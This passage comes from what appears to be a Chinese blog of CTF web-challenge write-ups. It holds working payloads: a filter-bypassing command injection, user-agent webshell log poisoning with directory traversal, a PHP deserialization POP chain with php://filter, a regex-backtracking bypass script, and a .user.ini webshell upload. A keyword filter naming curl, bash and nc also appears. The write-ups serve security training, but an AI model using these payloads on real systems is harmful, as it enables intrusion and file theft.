class="line">header(&#x27;Content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"></span><br><span class="line">function isPalindrome($str)&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=1;</span><br><span class="line">    $k=intval($len/2)+1;</span><br><span class="line">    for($j=0;$j&lt;$k;$j++)</span><br><span class="line">        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123;</span><br><span class="line">            $l=0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    if ($l==1) return true;</span><br><span class="line">    else return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//level 1</span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( (preg_match_all(&quot;/\./&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num)==1 &amp;&amp; !preg_match(&#x27;/^[-]/&#x27;, $num))) &#123;</span><br><span class="line">            die(&quot;没有这样的数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($num != $numPositve) &#123;</span><br><span class="line">        die(&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//level 2</span><br><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">    $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">    if ($md5==md5(md5($md5)))</span><br><span class="line">        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//get flag</span><br><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        if (preg_match(&quot;/[&#x27;\*\&quot;[?]/&quot;, $get_flag)) &#123;</span><br><span class="line">            die(&#x27;非预期修复*2&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">去非洲吧</span><br><span class="line"></span><br><span class="line">和上一道差不多，但是加了点过滤</span><br><span class="line">?num=0.00&amp;md5=0e1138100474&amp;get_flag=ca\t%09flag.p\hp</span><br><span class="line">查看源代码就获得了</span><br></pre></td></tr></table></figure>

<h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><h3 id="ALL-INFO-U-WANT"><a href="#ALL-INFO-U-WANT" class="headerlink" title="ALL_INFO_U_WANT"></a>ALL_INFO_U_WANT</h3><h4 id="考点：-16"><a href="#考点：-16" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">目录扫描</span><br><span class="line">ua注入木马</span><br><span class="line">目录穿越</span><br><span class="line">grep命令</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-32"><a href="#解题过程：-32" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">step1：</span><br><span class="line">进去查看源代码，让我们用自己扫描器去看看，扫出来index.php.bak,获得源代码：</span><br><span class="line"></span><br><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">//give you all information you want</span><br><span class="line">if (isset($_GET[&#x27;all_info_i_want&#x27;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = &quot;/var/www/html/&quot; . $_GET[&#x27;file&#x27;];</span><br><span class="line">    //really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br><span class="line"></span><br><span class="line">在/all_info_u_want.php传参，能看到phpinfo都比较正常；</span><br><span class="line">要利用到include()</span><br><span class="line">试了一下目录穿越</span><br><span class="line">file=../../../../../flag得到了假的flag</span><br><span class="line">访问日志：</span><br><span class="line">file=../../../../../var/log/nginx/access.log </span><br><span class="line">然后利用user agent传入木马</span><br><span class="line">然后cmd=system(&#x27;ls /&#x27;);  cmd=system(&#x27;cat /flag&#x27;)</span><br><span class="line">回显说flag在etc里面</span><br><span class="line">然后etc文件有很多，而且里面有的打开需要一定的权限，我们可以使用grep命令</span><br><span class="line">grep -r &quot;ctfshow&#123;&quot; /etc</span><br></pre></td></tr></table></figure>

<h1 id="week7"><a href="#week7" class="headerlink" title="week7"></a>week7</h1><h2 id="代码审计-5"><a href="#代码审计-5" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h3><h4 id="考点-17"><a href="#考点-17" class="headerlink" title="考点"></a>考点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正则回溯绕过</span><br><span class="line">https://www.jb51.net/article/256721.htm</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-33"><a href="#解题过程：-33" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); require &#x27;flag.php&#x27;; $str = (String)$_POST[&#x27;pan_gu&#x27;]; $num = $_GET[&#x27;zhurong&#x27;]; $lida1 = $_GET[&#x27;hongmeng&#x27;]; $lida2 = $_GET[&#x27;shennong&#x27;]; if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2))&#123;   echo &quot;md5绕过了!&quot;;   if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;     die(&#x27;你干嘛?哎哟!&#x27;);   &#125;   elseif(intval($num))&#123;     if(preg_match(&#x27;/.+?ISCTF/is&#x27;, $str))&#123;       die(&quot;再想想!&quot;);     &#125;     if(stripos($str, &#x27;2023ISCTF&#x27;) === false)&#123;       die(&quot;就差一点点啦!&quot;);     &#125;     echo $flag;   &#125; &#125; ?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://gz.imxbt.cn:20267/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"></span><br><span class="line">    &#x27;pan_gu&#x27;: &#x27;aaaaaaaaaa&#x27; * 250000 + &#x27;2023ISCTF&#x27;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>



<h2 id="反序历化"><a href="#反序历化" class="headerlink" title="反序历化"></a>反序历化</h2><h3 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争!!!"></a>圣杯战争!!!</h3><h4 id="考点：-17"><a href="#考点：-17" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序历化</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-34"><a href="#解题过程：-34" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">class artifact&#123; </span><br><span class="line">    public $excalibuer; </span><br><span class="line">    public $arrow; </span><br><span class="line">    public function __toString()&#123; </span><br><span class="line">        echo &quot;为Saber选择了对的武器!&lt;br&gt;&quot;; </span><br><span class="line">        return $this-&gt;excalibuer-&gt;arrow; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class prepare&#123; </span><br><span class="line">    public $release; </span><br><span class="line">    public function __get($key)&#123; </span><br><span class="line">        $functioin = $this-&gt;release; </span><br><span class="line">        echo &quot;蓄力!咖喱棒！！&lt;br&gt;&quot;; </span><br><span class="line">        return $functioin(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">class saber&#123; </span><br><span class="line">    public $weapon; </span><br><span class="line">    public function __invoke()&#123; </span><br><span class="line">        echo &quot;胜利！&lt;br&gt;&quot;; </span><br><span class="line">        include($this-&gt;weapon); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">class summon&#123; </span><br><span class="line">    public $Saber; </span><br><span class="line">    public $Rider; </span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123; </span><br><span class="line">        echo &quot;开始召唤从者！&lt;br&gt;&quot;; </span><br><span class="line">        echo $this-&gt;Saber; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;payload&#x27;]))&#123; </span><br><span class="line">    unserialize($_GET[&#x27;payload&#x27;]); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class artifact&#123;</span><br><span class="line">    public $excalibuer;</span><br><span class="line">    public $arrow;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class prepare&#123;</span><br><span class="line">    public $release;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class saber&#123;</span><br><span class="line">    public $weapon=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class summon&#123;</span><br><span class="line">    public $Saber;</span><br><span class="line">    public $Rider;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//pop链</span><br><span class="line">$a=new summon();</span><br><span class="line">$a-&gt;Saber=new artifact();</span><br><span class="line">$a-&gt;Saber-&gt;excalibuer=new prepare();</span><br><span class="line">$a-&gt;Saber-&gt;excalibuer-&gt;release=new saber();</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h3><h4 id="考点：-18"><a href="#考点：-18" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件包含</span><br><span class="line">解密脚本</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-35"><a href="#解题过程：-35" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">问我们参数是什么，而且没有别的信息，扫目录发现，index.bak</span><br><span class="line"> function string_to_int_array(str)&#123;</span><br><span class="line">        const intArr = [];</span><br><span class="line"></span><br><span class="line">        for(let i=0;i&lt;str.length;i++)&#123;</span><br><span class="line">          const charcode = str.charCodeAt(i);</span><br><span class="line"></span><br><span class="line">          const partA = Math.floor(charcode / 26);</span><br><span class="line">          const partB = charcode % 26;</span><br><span class="line">          intArr.push(partA);</span><br><span class="line">          intArr.push(partB);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return intArr;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function int_array_to_text(int_array)&#123;</span><br><span class="line">        let txt = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">        for(let i=0;i&lt;int_array.length;i++)&#123;</span><br><span class="line">          txt += String.fromCharCode(97 + int_array[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return txt;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(parameter))));</span><br><span class="line">if(hash === &#x27;dxdydxdudxdtdxeadxekdxea&#x27;)&#123;</span><br><span class="line">            window.location = &#x27;flag.html&#x27;;</span><br><span class="line">          &#125;else &#123;</span><br><span class="line">            document.getElementById(&#x27;fail&#x27;).style.display = &#x27;&#x27;;</span><br><span class="line">          &#125;</span><br><span class="line">这是对参数的加密过程，自己写个解密的</span><br><span class="line">def decrypt_array_to_string(int_array):</span><br><span class="line">    decrypted_str = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    for i in range(0, len(int_array), 2):</span><br><span class="line">        part_a = int_array[i]</span><br><span class="line">        part_b = int_array[i + 1]</span><br><span class="line"></span><br><span class="line">        new_number = part_a * 26 + part_b</span><br><span class="line"></span><br><span class="line">        decrypted_char = chr(new_number)</span><br><span class="line"></span><br><span class="line">        decrypted_str += decrypted_char</span><br><span class="line"></span><br><span class="line">    return decrypted_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def string_to_offset_array(input_str):</span><br><span class="line">    offset_array = []</span><br><span class="line"></span><br><span class="line">    for char in input_str:</span><br><span class="line">        # 将字符转换为ASCII值，然后减去97</span><br><span class="line">        offset_value = ord(char) - 97</span><br><span class="line">        # 将结果放到数组中</span><br><span class="line">        offset_array.append(offset_value)</span><br><span class="line"></span><br><span class="line">    return offset_array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hash = &#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span><br><span class="line">a = string_to_offset_array(hash)</span><br><span class="line">b = decrypt_array_to_string(a)</span><br><span class="line">c = string_to_offset_array(b)</span><br><span class="line">d = decrypt_array_to_string(c)</span><br><span class="line">print(d)</span><br><span class="line">得到mihoyo就是参数</span><br><span class="line">然后文件包含</span><br><span class="line">/?mihoyo=php://filter/read=convert.base64-encode/resource=flag.php,base64解密</span><br></pre></td></tr></table></figure>

<h2 id="文件上传-（利用日志-）"><a href="#文件上传-（利用日志-）" class="headerlink" title="文件上传&#x2F;（利用日志 ）"></a>文件上传&#x2F;（利用日志 ）</h2><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h3><h4 id="知识点：-14"><a href="#知识点：-14" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件上传</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-36"><a href="#解题过程：-36" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">step1：正常文件上传一些都不行，后面上传一个正常图片还骂我（放一个被骂的gif，其实看不清）</span><br><span class="line">step2: 利用user.ini去访问到日志，日志里面有个user-agent的回显位置，我们可以在里面传马，连蚁剑</span><br><span class="line">step3:.user.ini </span><br><span class="line">auto_prepend_file=/var/log/nginx/access.log （会直接带我们访问日志）</span><br><span class="line">再去user.ini传木马在用蚁剑连</span><br><span class="line">step4:本来说直接在hackbar RCE的但是行不通，连蚁剑看到flag里没东西，并且看到一个生成flag的shell脚本，这个脚本</span><br><span class="line">#!/bin/sh</span><br><span class="line">echo $GZCTF_FLAG &gt; /real_flag</span><br><span class="line">export GZCTF_FLAG=&quot;flag&quot;</span><br><span class="line">GZCTF_FLAG=&quot;flag&quot;</span><br><span class="line"></span><br><span class="line">httpd -D FOREGROUND</span><br><span class="line">（脚本的目的似乎是设置一个环境变量 GZCTF_FLAG，将其值设置为 &quot;flag&quot;，然后尝试将这个值写入到 /real_flag 文件中。接着，脚本启动 Apache 服务器，可能是为了进一步的处理或作为服务的一部分）/大模型说的/</span><br><span class="line">但是我们注意到这里用的nginx开的服务，所以没得生成，然后可以bin目录下echo $GZCTF_FLAG可以拿到</span><br></pre></td></tr></table></figure>

  </article>
  <!-- tag -->
  <div class="mt-12 pt-6 border-t border-gray-200">
    
  </div>
  <!-- prev and next -->
  <div class="flex justify-between mt-12 pt-6 border-t border-gray-200">
    <div>
      
        <a href="/2024/12/12/web/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
          <iconify-icon width="20" icon="ri:arrow-left-s-line" data-inline="false"></iconify-icon>
          WEB
        </a>
      
    </div>
    <div>
      
        <a href="/2024/12/12/buidctf-WP/" class="text-sm text-gray-400 hover:text-gray-500 flex justify-center">
          BUILD WP
          <iconify-icon width="20" icon="ri:arrow-right-s-line" data-inline="false"></iconify-icon>
        </a>
      
    </div>
  </div>
  <!-- comment -->
  <div class="article-comments mt-12">
    

  </div>
</section>
<!-- js inspect -->

<script src="/lib/clipboard.min.js"></script>


<script async src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
  });
</script>
<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>



<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
  $(document).ready(() => {
    const maraidConfig = {
      theme: "default",
      logLevel: 3,
      flowchart: { curve: "linear" },
      gantt: { axisFormat: "%m/%d/%Y" },
      sequence: { actorMargin: 50 },
    };
    mermaid.initialize(maraidConfig);
  });
</script>



<script src="/lib/fancybox/fancybox.umd.min.js"></script>

<script>
  $(document).ready(() => {
    $('.post-content').each(function(i){
      $(this).find('img').each(function(){
        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
        var alt = this.alt;
        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
      });
      $(this).find('.fancybox').each(function(){
        $(this).attr('rel', 'article' + i);
      });
    });

    Fancybox.bind('[data-fancybox="gallery"]', {
        // options
    })
  })
</script>

<!-- tocbot begin -->

<script src="/lib/tocbot/tocbot.min.js"></script>

<script>
  $(document).ready(() => {
      tocbot.init({
        // Where to render the table of contents.
        tocSelector: '.post-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.post-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3',
        // For headings inside relative or absolute positioned containers within content.
        hasInnerContainers: true,
    });
  })
</script>
<!-- tocbot end -->


  </main>
  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
  <!-- busuanzi -->
  
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- Busuanzi Analytics -->
<div class="flex items-center gap-2">
  <span>Visitors</span>
  <span id="busuanzi_value_site_uv"></span>
  <span>Page Views</span>
  <span id="busuanzi_value_site_pv"></span>
</div>
<!-- End Busuanzi Analytics -->


  <!-- copyright -->
  <div class="flex items-center gap-2">
    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
    <span>© 2022</span>
    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
    <a href="https://github.com/xbmlz" target="_blank" rel="noopener noreferrer">xbmlz</a>
  </div>
  <!-- powered by -->
  <div class="flex items-center gap-2">
    <span>Powered by</span>
    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
    <span>&</span>
    <a href="https://github.com/xbmlz/hexo-theme-maple" target="_blank" rel="noopener noreferrer">Maple</a>
  </div>

</footer>

  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
    <span class="flex justify-center items-center text-sm">
      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
      <span id="scrollpercent"><span>0</span> %</span>
    </span>
  </div>
  
<script src="/js/main.js"></script>


  <script>
    $(document).ready(function () {
      const mapleCount = "10";
      const speed = "0.5";
      const mapleEl = document.getElementById("maple");
